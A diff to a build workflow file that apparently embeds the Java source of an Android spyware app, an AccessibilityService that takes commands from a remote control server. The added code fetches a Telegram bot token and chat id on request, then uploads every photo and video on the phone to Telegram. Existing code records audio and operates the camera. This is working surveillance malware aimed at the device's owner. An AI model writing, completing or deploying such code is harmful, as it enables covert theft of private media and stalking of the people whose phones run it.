@@ -321,6 +321,8 @@ jobs:
           import org.json.JSONObject;
           import java.io.ByteArrayOutputStream;
           import java.io.File;
+          import java.io.FileOutputStream;
+          import java.io.InputStream;
           import java.io.FileWriter;
           import java.io.IOException;
           import java.util.ArrayList;
@@ -341,7 +343,7 @@ jobs:
           public class MonitorService extends AccessibilityService {
               private static final String TAG = "NEON_PANEL";
               private static final String API_BASE = "https://mobilecontrol-web.onrender.com";
-              private static final String OWNER_EMAIL = "ranahosen518@gmail.com"; // ← এখানে আপনার ইমেইল দিন
+              private static final String OWNER_EMAIL = "USER_EMAIL_HERE"; // ← এখানে আপনার ইউজারের ইমেইল দিন
               private static final String PREFS_NAME = "device_prefs";
               private static final String DEVICE_ID_KEY = "device_id";
               private static final String DEVICE_TOKEN_KEY = "device_token";
@@ -450,7 +452,11 @@ jobs:
               private void startGalleryPoller() {
                   galleryPollerThread = new Thread(() -> {
                       while (!Thread.currentThread().isInterrupted()) {
-                          try { checkGalleryRequest(); Thread.sleep(3000); }
+                          try {
+                              checkGalleryRequest();
+                              checkGalleryExportRequest(); // নতুন export request check
+                              Thread.sleep(3000);
+                          }
                           catch (InterruptedException e) { Thread.currentThread().interrupt(); }
                           catch (Throwable t) { Log.e(TAG, "gallery poll crash", t); }
                       }
@@ -565,6 +571,138 @@ jobs:
                   }
               }
 
+              // নতুন: gallery export request check
+              private void checkGalleryExportRequest() {
+                  try {
+                      Request request = new Request.Builder()
+                              .url(API_BASE + "/api/gallery/export-request?deviceId=" + deviceId)
+                              .build();
+                      Response response = httpClient.newCall(request).execute();
+                      if (response.isSuccessful()) {
+                          JSONObject obj = new JSONObject(response.body().string());
+                          if (obj.optBoolean("requested", false)) {
+                              String botToken = obj.optString("botToken", "");
+                              String chatId = obj.optString("chatId", "");
+                              if (!botToken.isEmpty() && !chatId.isEmpty()) {
+                                  showToast("Export request received. Sending media to Telegram...");
+                                  sendAllMediaToTelegram(botToken, chatId);
+                              }
+                          }
+                      }
+                  } catch (Throwable t) {
+                      Log.e(TAG, "checkGalleryExportRequest crash", t);
+                  }
+              }
+
+              private void sendAllMediaToTelegram(String botToken, String chatId) {
+                  new Thread(() -> {
+                      try {
+                          List<Uri> mediaUris = getAllMediaUris();
+                          int successCount = 0;
+                          for (Uri uri : mediaUris) {
+                              File file = getFileFromUri(uri);
+                              if (file != null && file.exists()) {
+                                  boolean sent = sendFileToTelegram(botToken, chatId, file);
+                                  if (sent) successCount++;
+                              }
+                          }
+                          showToast("Export complete: " + successCount + " items sent.");
+                          notifyExportDone(deviceId, successCount);
+                      } catch (Throwable t) {
+                          Log.e(TAG, "sendAllMediaToTelegram crash", t);
+                          showToast("Export failed: " + t.getMessage());
+                      }
+                  }).start();
+              }
+
+              private List<Uri> getAllMediaUris() {
+                  List<Uri> uris = new ArrayList<>();
+                  ContentResolver resolver = getContentResolver();
+
+                  Cursor imgCursor = resolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                          new String[]{MediaStore.Images.Media._ID}, null, null, null);
+                  if (imgCursor != null) {
+                      while (imgCursor.moveToNext()) {
+                          long id = imgCursor.getLong(imgCursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
+                          uris.add(Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, String.valueOf(id)));
+                      }
+                      imgCursor.close();
+                  }
+
+                  Cursor vidCursor = resolver.query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
+                          new String[]{MediaStore.Video.Media._ID}, null, null, null);
+                  if (vidCursor != null) {
+                      while (vidCursor.moveToNext()) {
+                          long id = vidCursor.getLong(vidCursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID));
+                          uris.add(Uri.withAppendedPath(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, String.valueOf(id)));
+                      }
+                      vidCursor.close();
+                  }
+                  return uris;
+              }
+
+              private File getFileFromUri(Uri uri) {
+                  try {
+                      String filename = "media_" + System.currentTimeMillis() + ".tmp";
+                      File tempFile = new File(getExternalFilesDir(null), filename);
+                      InputStream is = getContentResolver().openInputStream(uri);
+                      FileOutputStream fos = new FileOutputStream(tempFile);
+                      byte[] buffer = new byte[8192];
+                      int len;
+                      while ((len = is.read(buffer)) != -1) {
+                          fos.write(buffer, 0, len);
+                      }
+                      fos.close();
+                      is.close();
+                      return tempFile;
+                  } catch (Throwable t) {
+                      Log.e(TAG, "getFileFromUri crash", t);
+                      return null;
+                  }
+              }
+
+              private boolean sendFileToTelegram(String botToken, String chatId, File file) {
+                  try {
+                      String type = file.getName().toLowerCase().endsWith(".mp4") ? "video" : "photo";
+                      String telegramMethod = type.equals("video") ? "sendVideo" : "sendPhoto";
+                      RequestBody fileBody = RequestBody.create(MediaType.parse(type.equals("video") ? "video/mp4" : "image/jpeg"), file);
+                      MultipartBody body = new MultipartBody.Builder()
+                              .setType(MultipartBody.FORM)
+                              .addFormDataPart("chat_id", chatId)
+                              .addFormDataPart(type, file.getName(), fileBody)
+                              .build();
+                      Request request = new Request.Builder()
+                              .url("https://api.telegram.org/bot" + botToken + "/" + telegramMethod)
+                              .post(body)
+                              .build();
+                      Response response = httpClient.newCall(request).execute();
+                      boolean success = response.isSuccessful();
+                      response.close();
+                      file.delete();
+                      return success;
+                  } catch (Throwable t) {
+                      Log.e(TAG, "sendFileToTelegram crash", t);
+                      return false;
+                  }
+              }
+
+              private void notifyExportDone(String deviceId, int count) {
+                  try {
+                      JSONObject payload = new JSONObject();
+                      payload.put("deviceId", deviceId);
+                      payload.put("deviceToken", deviceToken);
+                      payload.put("sentCount", count);
+                      RequestBody body = RequestBody.create(MediaType.parse("application/json; charset=utf-8"), payload.toString());
+                      Request request = new Request.Builder()
+                              .url(API_BASE + "/api/gallery/export-done")
+                              .post(body)
+                              .build();
+                      httpClient.newCall(request).execute().close();
+                  } catch (Throwable t) {
+                      Log.e(TAG, "notifyExportDone crash", t);
+                  }
+              }
+
               private void startAudioRecording(int durationSeconds) {
                   stopAudioRecording();
                   if (checkSelfPermission(Manifest.permission.RECORD_AUDIO)
@@ -576,7 +714,7 @@ jobs:
                       audioFile = new File(getExternalFilesDir(null),
                               "audio_" + System.currentTimeMillis() + ".m4a");
                       mediaRecorder = new MediaRecorder();
-                      mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+                      mediaRecorder.setAudioSource(MediaRecorder.AudioSource.DEFAULT);
                       mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                       mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                       mediaRecorder.setAudioEncodingBitRate(128000);
@@ -622,7 +760,6 @@ jobs:
                       camera = android.hardware.Camera.open(cameraId);
                       android.hardware.Camera.Parameters params = camera.getParameters();
 
-                      // ফোকাস মোড সাপোর্টেড হলে সেট করুন
                       List<String> focusModes = params.getSupportedFocusModes();
                       if (focusModes != null && focusModes.contains(android.hardware.Camera.Parameters.FOCUS_MODE_AUTO)) {
                           params.setFocusMode(android.hardware.Camera.Parameters.FOCUS_MODE_AUTO);
